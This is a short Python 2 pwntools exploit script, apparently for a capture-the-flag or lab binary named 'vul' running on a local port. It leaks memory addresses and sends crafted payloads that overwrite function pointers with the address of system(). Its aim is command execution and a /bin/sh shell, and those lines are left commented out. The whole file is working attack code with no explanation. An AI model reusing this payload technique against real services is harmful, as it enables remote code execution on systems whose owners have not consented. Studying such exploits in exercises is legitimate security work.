# coding: utf-8
#!/usr/bin/env python
from pwn import *

elf = ELF('../vul')

# p = process('./dop')
p = remote('127.0.0.1',41037)#服务器端口号需提取

# old_value_addr = int(p.recv(),16)
old_value_addr = u64(p.recv())
print "old_value_addr:"+hex(old_value_addr)

pmf1_addr = elf.symbols['pmf1']
pmf2_addr = elf.symbols['pmf2']
pmf3_addr = elf.symbols['pmf3']
mf3_addr =  elf.symbols['mf3']

payload_1 = "A"*9 + p32(8) + p32(1) + p64(pmf1_addr) + p64(pmf3_addr)

#get system address
p.send(payload_1)
print p.recv()
p.send(payload_1)
system_addr = u64(p.recv())
print "system_addr:"+hex(system_addr)

#set low system address to oldvalue
payload_2 = "A" + p64(system_addr) + p32(9) + p32(2) + p64(mf3_addr) + p64(old_value_addr)
p.send(payload_2)
print p.recv()

#set high system address to newvalue
payload_3 = "A" + p64(system_addr) + p32(9) + p32(2) + p64(mf3_addr+4) + p64(old_value_addr+4)
p.send(payload_3)
print p.recv()

#set /bin/sh to register rdi
payload_4 = "ls\0" + "a"*6 + p32(0) + p32(3) + p64(pmf2_addr) + p64(pmf3_addr)
#payload_4 = "ls\0" + "a"*6 + p32(0) + p32(3)
p.send(payload_4)

#attack system("/bin/sh")
#p.interactive()
